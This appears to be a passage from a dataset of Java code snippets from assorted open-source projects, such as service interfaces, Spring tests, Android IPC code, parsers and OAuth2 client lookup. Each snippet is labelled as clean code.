 * Synchronizes the configuration file for the given id.
 * @param id The id of the configuration file to be synchronized.
 * @throws IOException If an I/O error occurs while synchronizing the configuration file.
 */
  void syncConf(  Long id) throws IOException ;
  /** 
 * Checks the validity of the given ID.
 * @param id The ID to check for validity.
 */
  void validity(  Long id);
  IPage<FlinkEnv> findPage(  FlinkEnv flinkEnv,  RestRequest restRequest);
}
",0,Clean Code
"/** 
 * {@link DataPermission} 注解的 Context 上下文
 * @author 芋道源码
 */
public class DataPermissionContextHolder {
  /** 
 * 使用 List 的原因，可能存在方法的嵌套调用
 */
  private static final ThreadLocal<LinkedList<DataPermission>> DATA_PERMISSIONS=TransmittableThreadLocal.withInitial(LinkedList::new);
  /** 
 * 获得当前的 DataPermission 注解
 * @return DataPermission 注解
 */
  public static DataPermission get(){
    return DATA_PERMISSIONS.get().peekLast();
  }
  /** 
 * 入栈 DataPermission 注解
 * @param dataPermission DataPermission 注解
 */
  public static void add(  DataPermission dataPermission){
    DATA_PERMISSIONS.get().addLast(dataPermission);
  }
  /** 
 * 出栈 DataPermission 注解
 * @return DataPermission 注解
 */
  public static DataPermission remove(){
    DataPermission dataPermission=DATA_PERMISSIONS.get().removeLast();
    if (DATA_PERMISSIONS.get().isEmpty()) {
      DATA_PERMISSIONS.remove();
    }
    return dataPermission;
  }
  /** 
 * 获得所有 DataPermission
 * @return DataPermission 队列
 */
  public static List<DataPermission> getAll(){
    return DATA_PERMISSIONS.get();
  }
  /** 
 * 清空上下文 目前仅仅用于单测
 */
  public static void clear(){
    DATA_PERMISSIONS.remove();
  }
}
",0,Clean Code
"public class HostAddPluginViewActivity extends Activity implements HostAddPluginViewContainer {
  private ViewGroup mPluginViewContainer;
  @Override protected void onCreate(  Bundle savedInstanceState){
    super.onCreate(savedInstanceState);
    LinearLayout activityContentView=new LinearLayout(this);
    activityContentView.setOrientation(LinearLayout.VERTICAL);
    LinearLayout.LayoutParams wrapContent=new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT,ViewGroup.LayoutParams.WRAP_CONTENT);
    TextView note=new TextView(this);
    note.setLayoutParams(wrapContent);
    note.setText(""需要先启动插件sample-plugin-app后，才能点下面的加载插件View"");
    Button loadButton=new Button(this);
    loadButton.setText(""加载插件View"");
    loadButton.setOnClickListener(this::loadPluginView);
    loadButton.setLayoutParams(wrapContent);
    ViewGroup pluginViewContainer=new LinearLayout(this);
    pluginViewContainer.setLayoutParams(wrapContent);
    mPluginViewContainer=pluginViewContainer;
    View[] views={note,loadButton,pluginViewContainer};
    for (    View view : views) {
      activityContentView.addView(view);
    }
    setContentView(activityContentView);
  }
  private void loadPluginView(  View view){
    view.setEnabled(false);
    Intent intent=new Intent();
    intent.setPackage(getPackageName());
    intent.setAction(""sample_host.manager.startPluginService"");
    final int id=System.identityHashCode(this);
    HostAddPluginViewContainerHolder.instances.put(id,this);
    intent.putExtra(""id"",id);
    sendBroadcast(intent);
  }
  @Override public void addView(  View view){
    mPluginViewContainer.addView(view);
  }
}
",0,Clean Code
"@EnvTest public class EntityBoundingBoxIntegrationTest {
  @Test public void pose(  Env env){
    var instance=env.createFlatInstance();
    var connection=env.createConnection();
    var player=connection.connect(instance,new Pos(0,42,0));
    assertEquals(player.getEntityType().registry().boundingBox(),player.getBoundingBox());
    player.setPose(EntityPose.STANDING);
    assertEquals(player.getEntityType().registry().boundingBox(),player.getBoundingBox());
    player.setPose(EntityPose.SLEEPING);
    assertEquals(new BoundingBox(0.2,0.2,0.2),player.getBoundingBox());
    player.setPose(EntityPose.SNEAKING);
    assertEquals(new BoundingBox(0.6,1.5,0.6),player.getBoundingBox());
    player.setPose(EntityPose.FALL_FLYING);
    assertEquals(new BoundingBox(0.6,0.6,0.6),player.getBoundingBox());
  }
  @Test public void eyeHeight(  Env env){
    var instance=env.createFlatInstance();
    var connection=env.createConnection();
    var player=connection.connect(instance,new Pos(0,42,0));
    assertEquals(1.62,player.getEyeHeight());
    player.setPose(EntityPose.SLEEPING);
    assertEquals(0.2,player.getEyeHeight());
    player.setPose(EntityPose.SNEAKING);
    assertEquals(1.27,player.getEyeHeight());
    player.setPose(EntityPose.FALL_FLYING);
    assertEquals(0.4,player.getEyeHeight());
  }
  @Test public void pickupItem(  Env env){
    final var instance=env.createFlatInstance();
    final var listener=env.listen(PickupItemEvent.class);
    final var spawnPos=new Pos(0,42,0);
    final var entity=new LivingEntity(EntityType.ZOMBIE);
    entity.setCanPickupItem(true);
    entity.setInstance(instance,spawnPos).join();
    var time=System.currentTimeMillis();
    dropItem(instance,spawnPos);
    listener.followup();
    entity.update(time+=1_000L);
    dropItem(instance,spawnPos.sub(.5));
    listener.followup();
    entity.update(time+=1_000L);
  }
  private void dropItem(  final Instance instance,  final Pos position){
    final var entity=new ItemEntity(ItemStack.of(Material.STONE));
    entity.hasPhysics=false;
    entity.setNoGravity(true);
    entity.setInstance(instance,position).join();
  }
}
",0,Clean Code
"/** 
 * 小说排行榜 缓存管理类
 * @author xiongxiaoyang
 * @date 2022/5/12
 */
@Component @RequiredArgsConstructor public class BookRankCacheManager {
  private final BookInfoMapper bookInfoMapper;
  /** 
 * 查询小说点击榜列表，并放入缓存中
 */
  @Cacheable(cacheManager=CacheConsts.REDIS_CACHE_MANAGER,value=CacheConsts.BOOK_VISIT_RANK_CACHE_NAME) public List<BookRankRespDto> listVisitRankBooks(){
    QueryWrapper<BookInfo> bookInfoQueryWrapper=new QueryWrapper<>();
    bookInfoQueryWrapper.orderByDesc(DatabaseConsts.BookTable.COLUMN_VISIT_COUNT);
    return listRankBooks(bookInfoQueryWrapper);
  }
  /** 
 * 查询小说新书榜列表，并放入缓存中
 */
  @Cacheable(cacheManager=CacheConsts.CAFFEINE_CACHE_MANAGER,value=CacheConsts.BOOK_NEWEST_RANK_CACHE_NAME) public List<BookRankRespDto> listNewestRankBooks(){
    QueryWrapper<BookInfo> bookInfoQueryWrapper=new QueryWrapper<>();
    bookInfoQueryWrapper.gt(DatabaseConsts.BookTable.COLUMN_WORD_COUNT,0).orderByDesc(DatabaseConsts.CommonColumnEnum.CREATE_TIME.getName());
    return listRankBooks(bookInfoQueryWrapper);
  }
  /** 
 * 查询小说更新榜列表，并放入缓存中
 */
  @Cacheable(cacheManager=CacheConsts.CAFFEINE_CACHE_MANAGER,value=CacheConsts.BOOK_UPDATE_RANK_CACHE_NAME) public List<BookRankRespDto> listUpdateRankBooks(){
    QueryWrapper<BookInfo> bookInfoQueryWrapper=new QueryWrapper<>();
    bookInfoQueryWrapper.gt(DatabaseConsts.BookTable.COLUMN_WORD_COUNT,0).orderByDesc(DatabaseConsts.CommonColumnEnum.UPDATE_TIME.getName());
    return listRankBooks(bookInfoQueryWrapper);
  }
  private List<BookRankRespDto> listRankBooks(  QueryWrapper<BookInfo> bookInfoQueryWrapper){
    bookInfoQueryWrapper.gt(DatabaseConsts.BookTable.COLUMN_WORD_COUNT,0).last(DatabaseConsts.SqlEnum.LIMIT_30.getSql());
    return bookInfoMapper.selectList(bookInfoQueryWrapper).stream().map(v -> {
      BookRankRespDto respDto=new BookRankRespDto();
      respDto.setId(v.getId());
      respDto.setCategoryId(v.getCategoryId());
      respDto.setCategoryName(v.getCategoryName());
      respDto.setBookName(v.getBookName());
      respDto.setAuthorName(v.getAuthorName());
      respDto.setPicUrl(v.getPicUrl());
      respDto.setBookDesc(v.getBookDesc());
      respDto.setLastChapterName(v.getLastChapterName());
      respDto.setLastChapterUpdateTime(v.getLastChapterUpdateTime());
      respDto.setWordCount(v.getWordCount());
      return respDto;
    }
).toList();
  }
}
",0,Clean Code
"public interface SparkEnvService extends IService<SparkEnv> {
  /** 
 * Checks if a specific version of Flink exists.
 * @param version The version of Flink to check.
 * @return Returns enum value indicating the existence of the specified version.
 */
  FlinkEnvCheckEnum check(  SparkEnv version);
  /** 
 * Create a new instance.
 * @param version The version of SparkEnv to use.
 * @throws Exception if an error occurs during the creation process.
 * @return true if the instance is successfully created, false otherwise.
 */
  boolean create(  SparkEnv version) throws Exception ;
  /** 
 * Deletes a Flink environment with the provided ID.
 * @param id the ID of the Flink environment to delete
 */
  void removeById(  Long id);
  /** 
 * Updates the specified version of Flink environment.
 * @param version the version of Flink environment to update
 * @throws IOException if an I/O error occurs during the update process
 */
  void update(  SparkEnv version) throws IOException ;
  /** 
 * Get flink version by application id.
 * @param appId the ID of the application
 * @return the SparkEnv object representing the version of Flink associated with the given app ID
 */
  SparkEnv getByAppId(  Long appId);
  /** 
 * Sets the specified Flink version as the default.
 * @param id The ID of the Flink version to set as the default.
 */
  void setDefault(  Long id);
  /** 
 * Retrieves the default version of SparkEnv.
 * @return the default version of SparkEnv
 */
  SparkEnv getDefault();
  /** 
 * Retrieves a Flink environment by ID, if available. If the ID is null or not found, the method returns the default Flink environment.
 * @param id The ID of the Flink environment to retrieve. If null, the default environment will beretrieved.
 * @return The Flink environment with the specified ID, or the default environment if the ID isnull or not found.
 */
  SparkEnv getByIdOrDefault(  Long id);
  /** 
 * Synchronizes the configuration file for the given id.
 * @param id The id of the configuration file to be synchronized.
 * @throws IOException If an I/O error occurs while synchronizing the configuration file.
 */
  void syncConf(  Long id) throws IOException ;
  /** 
 * Checks the validity of the given ID.
 * @param id The ID to check for validity.
 */
  void validity(  Long id);
}
",0,Clean Code
"@SpringBootTest @AutoConfigureMockMvc public class MethodSecurityApplicationTests {
  @Autowired private MockMvc mockMvc;
  @Test public void accessSecuredResourceUnauthenticatedThenUnauthorized() throws Exception {
    mockMvc.perform(get(""/hello"")).andExpect(status().isUnauthorized());
  }
  @Test @WithMockUser public void accessSecuredResourceAuthenticatedThenOk() throws Exception {
    mockMvc.perform(get(""/hello"")).andExpect(status().isOk());
  }
  @Test @WithMockUser public void accessAdminPageAsUserThenForbidden() throws Exception {
    mockMvc.perform(get(""/admin/hello"")).andExpect(status().isForbidden());
  }
  @Test @WithMockUser(roles=""ADMIN"") public void accessAdminPageAsAdminThenOk() throws Exception {
    mockMvc.perform(get(""/admin/hello"")).andExpect(status().isOk());
  }
}
@SpringBootTest @AutoConfigureMockMvc public class MethodSecurityApplicationTests {
  @Autowired private MockMvc mockMvc;
  @Test public void accessSecuredResourceUnauthenticatedThenUnauthorized() throws Exception {
    mockMvc.perform(get(""/hello"")).andExpect(status().isUnauthorized());
  }
  @Test @WithMockUser public void accessSecuredResourceAuthenticatedThenOk() throws Exception {
    mockMvc.perform(get(""/hello"")).andExpect(status().isOk());
  }
  @Test @WithMockUser public void accessAdminPageAsUserThenForbidden() throws Exception {
    mockMvc.perform(get(""/admin/hello"")).andExpect(status().isForbidden());
  }
  @Test @WithMockUser(roles=""ADMIN"") public void accessAdminPageAsAdminThenOk() throws Exception {
    mockMvc.perform(get(""/admin/hello"")).andExpect(status().isOk());
  }
  @Test @WithMockUser public void accessHelloFilterThenOk() throws Exception {
    mockMvc.perform(get(""/filter/hello"")).andExpect(status().isOk()).andExpect(content().string(""Hello""));
  }
}
",0,Clean Code
"public class YamlFunction implements Function {
  final static ObjectMapper MAPPER=new ObjectMapper(new YAMLFactory()).findAndRegisterModules();
  private static final TypeReference<Object> TYPE_REFERENCE=new TypeReference<>(){
  }
;
  public List<String> getArgumentNames(){
    return List.of(""yaml"");
  }
  @Override public Object execute(  Map<String,Object> args,  PebbleTemplate self,  EvaluationContext context,  int lineNumber){
    if (!args.containsKey(""yaml"")) {
      throw new PebbleException(null,""The 'yaml' function expects an argument 'yaml'."",lineNumber,self.getName());
    }
    if (!(args.get(""yaml"") instanceof String)) {
      throw new PebbleException(null,""The 'yaml' function expects an argument 'yaml' with type string."",lineNumber,self.getName());
    }
    String yaml=(String)args.get(""yaml"");
    try {
      return MAPPER.readValue(yaml,TYPE_REFERENCE);
    }
 catch (    JacksonYAMLParseException e) {
      throw new PebbleException(null,""Invalid yaml: "" + e.getMessage(),lineNumber,self.getName());
    }
catch (    JsonMappingException e) {
      throw new PebbleException(null,""Invalid yaml: "" + e.getMessage(),lineNumber,self.getName());
    }
catch (    JsonProcessingException e) {
      throw new PebbleException(null,""Invalid yaml: "" + e.getMessage(),lineNumber,self.getName());
    }
  }
}
",0,Clean Code
"/** 
 * A decoded invoke-polymorphic instruction. 
 */
public class InvokePolymorphicDecodedInstruction extends DecodedInstruction {
  private final int protoIndex;
  private final int[] registers;
  public InvokePolymorphicDecodedInstruction(  InstructionCodec format,  int opcode,  int methodIndex,  IndexType indexType,  int protoIndex,  int[] registers){
    super(format,opcode,methodIndex,indexType,0,0);
    if (protoIndex != (short)protoIndex) {
      throw new IllegalArgumentException(""protoIndex doesn't fit in a short: "" + protoIndex);
    }
    this.protoIndex=protoIndex;
    this.registers=registers;
  }
  @Override public int getRegisterCount(){
    return registers.length;
  }
  @Override public DecodedInstruction withIndex(  int newIndex){
    throw new UnsupportedOperationException(""use withProtoIndex to update both the method and proto indices for"" + "" invoke-polymorphic"");
  }
  @Override public DecodedInstruction withProtoIndex(  int newIndex,  int newProtoIndex){
    return new InvokePolymorphicDecodedInstruction(getFormat(),getOpcode(),newIndex,getIndexType(),newProtoIndex,registers);
  }
  @Override public int getC(){
    return registers.length > 0 ? registers[0] : 0;
  }
  @Override public int getD(){
    return registers.length > 1 ? registers[1] : 0;
  }
  @Override public int getE(){
    return registers.length > 2 ? registers[2] : 0;
  }
  public int getF(){
    return registers.length > 3 ? registers[3] : 0;
  }
  public int getG(){
    return registers.length > 4 ? registers[4] : 0;
  }
  @Override public short getProtoIndex(){
    return (short)protoIndex;
  }
}
",0,Clean Code
"@SuppressWarnings(""rawtypes"") @Factory @Requires(missingProperty=""datasources"",condition=DatasourceProvider.H2RepositoryOrQueue.class) public class DatasourceProvider {
  @Singleton @Named(""h2"") public CustomDatasourceConfiguration getDatasourceConfiguration(){
    CustomDatasourceConfiguration memory=new CustomDatasourceConfiguration(""h2"");
    memory.setUrl(""jdbc:h2:mem:public"");
    memory.setUsername(""sa"");
    memory.setPassword("""");
    memory.setDriverClassName(""org.h2.Driver"");
    return memory;
  }
  @Singleton @Named(""h2"") public CustomFlywayConfiguration getFlywayConfiguration(){
    CustomFlywayConfiguration flyway=new CustomFlywayConfiguration(""h2"");
    flyway.setEnabled(true);
    flyway.setLocations(""classpath:migrations/h2"");
    flyway.setIgnoreMigrationPatterns(""*:missing"",""*:future"");
    flyway.getProperties().put(""outOfOrder"",""true"");
    return flyway;
  }
public static class CustomDatasourceConfiguration extends DatasourceConfiguration {
    public CustomDatasourceConfiguration(    String name){
      super(name);
    }
  }
public static class CustomFlywayConfiguration extends FlywayConfigurationProperties {
    public CustomFlywayConfiguration(    String name){
      super(name);
    }
  }
public static class H2RepositoryOrQueue implements Condition {
    @Override public boolean matches(    ConditionContext context){
      Optional<String> repositoryType=context.getProperty(""kestra.repository.type"",String.class);
      if (repositoryType.isPresent() && (repositoryType.get().equals(""h2"") || repositoryType.get().equals(""memory""))) {
        return true;
      }
      Optional<String> queueType=context.getProperty(""kestra.queue.type"",String.class);
      return queueType.isPresent() && (queueType.get().equals(""h2"") || queueType.get().equals(""memory""));
    }
  }
}
",0,Clean Code
"private static class IpcReceiver extends BroadcastReceiver {
  @Override public void onReceive(  Context ctx,  Intent intent){
    String action=intent.getAction();
    if (action == null) {
      return;
    }
    if (action.equals(GENERIC_WRAPPER) && intent.hasExtra(_REAL_INTENT)) {
      intent.setAction(intent.getStringExtra(_REAL_INTENT));
    }
    boolean done=false;
    for (    BroadcastListener bl : sBroadcastListeners) {
      done=done || bl.onReceive(ctx,intent);
    }
    if (done) {
      return;
    }
switch (action) {
case SYNC_FILE_CHANGED:
      int id=intent.getIntExtra(""id"",-1);
    int file=intent.getIntExtra(""file"",0);
  long uin=intent.getLongExtra(""uin"",0);
int what=intent.getIntExtra(""file"",0);
if (id != -1 && id != myId) {
onRecvFileChanged(file,uin,what);
}
break;
case HOOK_DO_INIT:
int myType=getProcessType();
int targetType=intent.getIntExtra(""process"",0);
int hookId=intent.getIntExtra(""hook"",-1);
if (hookId != -1 && (myType & targetType) != 0) {
AbsDelayableHook hook=AbsDelayableHook.getHookByType(hookId);
if (hook != null) {
try {
hook.init();
}
 catch (Throwable e) {
log(e);
}
}
}
break;
case ENUM_PROC_REQ:
myType=getProcessType();
if (!intent.hasExtra(""seq"")) {
break;
}
int seq=intent.getIntExtra(""seq"",0);
int mask=intent.getIntExtra(""mask"",0);
if ((mask & myType) != 0) {
Intent resp=new Intent(ENUM_PROC_RESP);
resp.setPackage(ctx.getPackageName());
initId();
resp.putExtra(""seq"",seq);
resp.putExtra(""pid"",android.os.Process.myPid());
resp.putExtra(""type"",myType);
resp.putExtra(""time"",System.currentTimeMillis());
resp.putExtra(""name"",getProcessName());
ctx.sendBroadcast(resp);
}
break;
case ENUM_PROC_RESP:
if (!intent.hasExtra(""seq"")) {
break;
}
seq=intent.getIntExtra(""seq"",0);
EnumRequestHolder holder=sEnumProcCallbacks.get(seq);
if (holder == null) {
break;
}
String name=intent.getStringExtra(""name"");
int pid=intent.getIntExtra(""pid"",0);
int type=intent.getIntExtra(""type"",0);
long time=intent.getLongExtra(""time"",-1);
ProcessInfo pi=new ProcessInfo();
pi.name=name;
pi.pid=pid;
pi.time=time;
pi.type=type;
holder.result.add(pi);
holder.callback.onResponse(holder,pi);
break;
}
}
}
",0,Clean Code
"private static class ArgumentsParser {
  /** 
 * The arguments to process. 
 */
  private final String[] arguments;
  /** 
 * The index of the next argument to process. 
 */
  private int index;
  /** 
 * The current argument being processed after a  {@link #getNext()} call. 
 */
  private String current;
  /** 
 * The last value of an argument processed by  {@link #isArg(String)}. 
 */
  private String lastValue;
  public ArgumentsParser(  String[] arguments){
    this.arguments=arguments;
    index=0;
  }
  public String getCurrent(){
    return current;
  }
  public String getLastValue(){
    return lastValue;
  }
  /** 
 * Moves on to the next argument. Returns false when we ran out of arguments that start with --.
 */
  public boolean getNext(){
    if (index >= arguments.length) {
      return false;
    }
    current=arguments[index];
    if (current.equals(""--"") || !current.startsWith(""--"")) {
      return false;
    }
    index++;
    return true;
  }
  /** 
 * Similar to  {@link #getNext()}, this moves on the to next argument. It does not check however whether the argument starts with -- and thus can be used to retrieve values.
 */
  private boolean getNextValue(){
    if (index >= arguments.length) {
      return false;
    }
    current=arguments[index];
    index++;
    return true;
  }
  /** 
 * Returns all the arguments that have not been processed yet. 
 */
  public String[] getRemaining(){
    int n=arguments.length - index;
    String[] remaining=new String[n];
    if (n > 0) {
      System.arraycopy(arguments,index,remaining,0,n);
    }
    return remaining;
  }
  /** 
 * Checks the current argument against the given prefix. If prefix is in the form '--name=', an extra value is expected. The argument can then be in the form '--name=value' or as a 2-argument form '--name value'.
 */
  public boolean isArg(  String prefix){
    int n=prefix.length();
    if (n > 0 && prefix.charAt(n - 1) == '=') {
      if (current.startsWith(prefix)) {
        lastValue=current.substring(n);
        return true;
      }
 else {
        prefix=prefix.substring(0,n - 1);
        if (current.equals(prefix)) {
          if (getNextValue()) {
            lastValue=current;
            return true;
          }
 else {
            System.err.println(""Missing value after parameter "" + prefix);
            throw new UsageException();
          }
        }
        return false;
      }
    }
 else {
      return current.equals(prefix);
    }
  }
}
",0,Clean Code
"public final class DuOutputParser {
  private static final Pattern duPattern=Pattern.compile(""([\\d]+)\\s+(.+)"");
  private DiskUsageEntry root;
  public DuOutputParser(  String folder){
    root=new DiskUsageEntry(PathUtils.getFileName(folder),"""",0,0,true);
  }
  public final DiskUsageEntry parseList(  List<String> lines,  int prefixLen){
    for (    String line : lines) {
      Matcher matcher=duPattern.matcher(line);
      if (matcher.find()) {
        try {
          long size=Long.parseLong(matcher.group(1)) * 512;
          String path=matcher.group(2).substring(prefixLen);
          addEntry(size,path);
        }
 catch (        Exception e) {
          e.printStackTrace();
        }
      }
    }
    return root;
  }
  private void addEntry(  long size,  String path){
    if (path.length() < 1 || path.equals(""/"")) {
      root.setSize(size);
      return;
    }
    String arr[]=path.split(""\\/"");
    DiskUsageEntry node=root;
    for (int i=1; i < arr.length - 1; i++) {
      String s=arr[i];
      boolean found=false;
      for (int j=0; j < node.getChildren().size(); j++) {
        DiskUsageEntry entry=node.getChildren().get(j);
        if (entry.getName().equals(s)) {
          node=entry;
          found=true;
          break;
        }
      }
      if (!found) {
        DiskUsageEntry entry=new DiskUsageEntry(s,node.getPath() + ""/"" + s,-1,0,true);
        entry.setDirectory(true);
        node.getChildren().add(entry);
        node=entry;
      }
    }
    String name=arr[arr.length - 1];
    DiskUsageEntry entry=null;
    for (    DiskUsageEntry ent : node.getChildren()) {
      if (ent.getName().equals(name)) {
        entry=ent;
        break;
      }
    }
    if (entry == null) {
      entry=new DiskUsageEntry(arr[arr.length - 1],node.getPath() + ""/"" + name,size,0,true);
      node.getChildren().add(entry);
    }
 else {
      entry.setSize(size);
    }
  }
}
",0,Clean Code
"/** 
 * State machine adapter that implements all methods with default behavior except  {@link #onApply(com.alipay.sofa.jraft.Iterator)}.
 * @author boyan (boyan@alibaba-inc.com)2018-Mar-30 10:32:27 AM
 */
public abstract class StateMachineAdapter implements StateMachine {
  private static final Logger LOG=LoggerFactory.getLogger(StateMachineAdapter.class);
  @Override public void onShutdown(){
    LOG.info(""onShutdown."");
  }
  @Override public void onSnapshotSave(  final SnapshotWriter writer,  final Closure done){
    error(""onSnapshotSave"");
    runClosure(done,""onSnapshotSave"");
  }
  @Override public boolean onSnapshotLoad(  final SnapshotReader reader){
    error(""onSnapshotLoad"",""while a snapshot is saved in "" + reader.getPath());
    return false;
  }
  @Override public void onLeaderStart(  final long term){
    LOG.info(""onLeaderStart: term={}."",term);
  }
  @Override public void onLeaderStop(  final Status status){
    LOG.info(""onLeaderStop: status={}."",status);
  }
  @Override public void onError(  final RaftException e){
    LOG.error(""Encountered an error={} on StateMachine {}, it's highly recommended to implement this method as raft stops working since some error occurs, you should figure out the cause and repair or remove this node."",e.getStatus(),getClassName(),e);
  }
  @Override public void onConfigurationCommitted(  final Configuration conf){
    LOG.info(""onConfigurationCommitted: {}."",conf);
  }
  @Override public void onStopFollowing(  final LeaderChangeContext ctx){
    LOG.info(""onStopFollowing: {}."",ctx);
  }
  @Override public void onStartFollowing(  final LeaderChangeContext ctx){
    LOG.info(""onStartFollowing: {}."",ctx);
  }
  @SuppressWarnings(""SameParameterValue"") private void runClosure(  final Closure done,  final String methodName){
    done.run(new Status(-1,""%s doesn't implement %s"",getClassName(),methodName));
  }
  private String getClassName(){
    return getClass().getName();
  }
  @SuppressWarnings(""SameParameterValue"") private void error(  final String methodName){
    error(methodName,"""");
  }
  private void error(  final String methodName,  final String msg){
    LOG.error(""{} doesn't implement {} {}."",getClassName(),methodName,msg);
  }
}",0,Clean Code
"/** 
 * @author : zlt
 * @date : 2023/08/04 <p> Blog: http://zlt2000.gitee.io Github: https://github.com/zlt2000
 */
@RequiredArgsConstructor @Component public class CustomRegisteredClientRepository implements RegisteredClientRepository {
  private final RegisteredClientService clientService;
  @Override public void save(  RegisteredClient registeredClient){
  }
  @Override public RegisteredClient findById(  String id){
    return this.findByClientId(id);
  }
  @Override public RegisteredClient findByClientId(  String clientId){
    ClientDto clientObj=clientService.loadClientByClientId(clientId);
    if (clientObj == null) {
      return null;
    }
    RegisteredClient.Builder builder=RegisteredClient.withId(clientObj.getClientId()).clientId(clientObj.getClientId()).clientSecret(clientObj.getClientSecret()).clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC);
    if (StrUtil.isNotBlank(clientObj.getAuthorizedGrantTypes())) {
      for (      String authorizedGrantType : clientObj.getAuthorizedGrantTypes().split(StrUtil.COMMA)) {
        builder.authorizationGrantType(new AuthorizationGrantType(authorizedGrantType));
      }
    }
    if (StrUtil.isNotBlank(clientObj.getWebServerRedirectUri())) {
      for (      String redirectUri : clientObj.getWebServerRedirectUri().split(StrUtil.COMMA)) {
        builder.redirectUri(redirectUri);
      }
    }
    if (StrUtil.isNotBlank(clientObj.getScope())) {
      for (      String scope : clientObj.getScope().split(StrUtil.COMMA)) {
        builder.scope(scope);
      }
    }
    OAuth2TokenFormat tokenFormat;
    if (OAuth2TokenFormat.SELF_CONTAINED.getValue().equals(clientObj.getTokenFormat())) {
      tokenFormat=OAuth2TokenFormat.SELF_CONTAINED;
    }
 else {
      tokenFormat=OAuth2TokenFormat.REFERENCE;
    }
    return builder.tokenSettings(TokenSettings.builder().accessTokenFormat(tokenFormat).accessTokenTimeToLive(Duration.ofSeconds(clientObj.getAccessTokenValiditySeconds())).refreshTokenTimeToLive(Duration.ofSeconds(clientObj.getRefreshTokenValiditySeconds())).build()).clientSettings(ClientSettings.builder().requireAuthorizationConsent(!BooleanUtil.toBoolean(clientObj.getAutoapprove())).build()).build();
  }
}
",0,Clean Code
"/** 
 * This InstructionVisitor deletes blocks of code that can never be reached by regular calls or branches.
 * @author Eric Lafortune
 */
public class UnreachableCodeRemover implements AttributeVisitor, InstructionVisitor {
  private static final Logger logger=LogManager.getLogger(UnreachableCodeRemover.class);
  private final InstructionVisitor extraInstructionVisitor;
  private final ReachableCodeMarker reachableCodeMarker=new ReachableCodeMarker();
  private final CodeAttributeEditor codeAttributeEditor=new CodeAttributeEditor();
  /** 
 * Creates a new UnreachableCodeRemover.
 */
  public UnreachableCodeRemover(){
    this(null);
  }
  /** 
 * Creates a new UnreachableCodeRemover.
 * @param extraInstructionVisitor an optional extra visitor for alldeleted instructions.
 */
  public UnreachableCodeRemover(  InstructionVisitor extraInstructionVisitor){
    this.extraInstructionVisitor=extraInstructionVisitor;
  }
  public void visitAnyAttribute(  Clazz clazz,  Attribute attribute){
  }
  public void visitCodeAttribute(  Clazz clazz,  Method method,  CodeAttribute codeAttribute){
    try {
      visitCodeAttribute0(clazz,method,codeAttribute);
    }
 catch (    RuntimeException ex) {
      logger.error(""Unexpected error while removing unreachable code:"");
      logger.error(""  Class       = [{}]"",clazz.getName());
      logger.error(""  Method      = [{}{}]"",method.getName(clazz),method.getDescriptor(clazz));
      logger.error(""  Exception   = [{}] ({})"",ex.getClass().getName(),ex.getMessage());
      throw ex;
    }
  }
  public void visitCodeAttribute0(  Clazz clazz,  Method method,  CodeAttribute codeAttribute){
    logger.debug(""UnreachableCodeRemover: {}.{}{}"",clazz.getName(),method.getName(clazz),method.getDescriptor(clazz));
    reachableCodeMarker.visitCodeAttribute(clazz,method,codeAttribute);
    codeAttributeEditor.reset(codeAttribute.u4codeLength);
    codeAttribute.instructionsAccept(clazz,method,this);
    codeAttributeEditor.visitCodeAttribute(clazz,method,codeAttribute);
  }
  public void visitAnyInstruction(  Clazz clazz,  Method method,  CodeAttribute codeAttribute,  int offset,  Instruction instruction){
    logger.debug(""  {} {}"",reachableCodeMarker.isReachable(offset) ? ""+"" : ""-"",instruction.toString(offset));
    if (!reachableCodeMarker.isReachable(offset)) {
      codeAttributeEditor.deleteInstruction(offset);
      if (extraInstructionVisitor != null) {
        instruction.accept(clazz,method,codeAttribute,offset,extraInstructionVisitor);
      }
    }
  }
}",0,Clean Code
"/** 
 * 用户移动指令处理器
 */
public class UserMoveToCmdHandler implements ICmdHandler<GameMsgProtocol.UserMoveToCmd> {
  @Override public void handle(  ChannelHandlerContext ctx,  GameMsgProtocol.UserMoveToCmd msg){
    Integer userId=(Integer)ctx.channel().attr(AttributeKey.valueOf(""userId"")).get();
    if (null == userId) {
      return;
    }
    GameMsgProtocol.UserMoveToCmd cmd=msg;
    GameMsgProtocol.UserMoveToResult.Builder resultBuilder=GameMsgProtocol.UserMoveToResult.newBuilder();
    resultBuilder.setMoveUserId(userId);
    resultBuilder.setMoveToPosX(cmd.getMoveToPosX());
    resultBuilder.setMoveToPosY(cmd.getMoveToPosY());
    GameMsgProtocol.UserMoveToResult newResult=resultBuilder.build();
    Broadcaster.broadcast(newResult);
  }
}
/** 
 * 用户移动指令处理器
 */
public class UserMoveToCmdHandler implements ICmdHandler<GameMsgProtocol.UserMoveToCmd> {
  @Override public void handle(  ChannelHandlerContext ctx,  GameMsgProtocol.UserMoveToCmd cmd){
    if (null == ctx || null == cmd) {
      return;
    }
    Integer userId=(Integer)ctx.channel().attr(AttributeKey.valueOf(""userId"")).get();
    if (null == userId) {
      return;
    }
    GameMsgProtocol.UserMoveToResult.Builder resultBuilder=GameMsgProtocol.UserMoveToResult.newBuilder();
    resultBuilder.setMoveUserId(userId);
    resultBuilder.setMoveToPosX(cmd.getMoveToPosX());
    resultBuilder.setMoveToPosY(cmd.getMoveToPosY());
    GameMsgProtocol.UserMoveToResult newResult=resultBuilder.build();
    Broadcaster.broadcast(newResult);
  }
}
",0,Clean Code
"public class ZookeeperConfigurationTest {
  private TestingServer zkServer;
  private ZookeeperConfiguration configuration;
  private URL registryUrl;
  @Before public void setup() throws Exception {
    int zkServerPort=NetUtils.getAvailablePort();
    zkServer=new TestingServer(zkServerPort,true);
    registryUrl=URL.valueOf(""zookeeper://localhost:"" + zkServerPort);
    configuration=new ZookeeperConfiguration();
    try {
      configuration.init();
      fail(""init should fail before setting registryUrl"");
    }
 catch (    IllegalStateException e) {
    }
    configuration.setUrl(registryUrl);
    configuration.init();
  }
  @Test public void testGetSetConfig(){
    configuration.setConfig(""test_key"",""test_value"");
    assertEquals(""test_value"",configuration.getConfig(""test_key""));
    assertEquals(null,configuration.getConfig(""not_exist_key""));
    configuration.setConfig(""test_group"",""test_key"",""test_group_value"");
    assertEquals(""test_group_value"",configuration.getConfig(""test_group"",""test_key""));
    assertEquals(null,configuration.getConfig(""test_group"",""not_exist_key""));
    try {
      configuration.getConfig(null);
      fail(""should throw IllegalArgumentException for null key"");
    }
 catch (    IllegalArgumentException e) {
    }
    try {
      configuration.setConfig(""test_null"",null);
      fail(""should throw IllegalArgumentException for null key"");
    }
 catch (    IllegalArgumentException e) {
    }
  }
  @Test public void testDeleteConfig(){
